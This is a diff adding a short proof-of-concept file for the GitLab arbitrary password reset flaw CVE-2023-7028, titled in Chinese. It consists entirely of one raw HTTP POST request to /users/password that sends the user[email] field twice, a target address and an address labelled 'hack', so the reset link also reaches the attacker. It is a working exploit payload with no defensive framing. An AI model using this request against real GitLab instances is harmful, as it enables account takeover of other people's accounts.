@@ -1,0 +1,12 @@
+# GitLab任意用户密码重置漏洞(CVE-2023-7028)
+POST /users/password HTTP/1.1
+Host: www.byp-test.com:8080
+Accept-Language: zh-CN
+Timeoffset: -28800000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 175
+
+authenticity_token=LqtG96hj8l3TqViNpUAAZvY4ibt7%2Fz2sHqN8eCRxsC6XAXwxs9zlKBt3tlV7zLkCGg1ELIchoulOvFpDOnml4g%3D%3D&user%5Bemail%5D=sadfaf%40qq.com&user%5Bemail%5D=hack%40qq.com
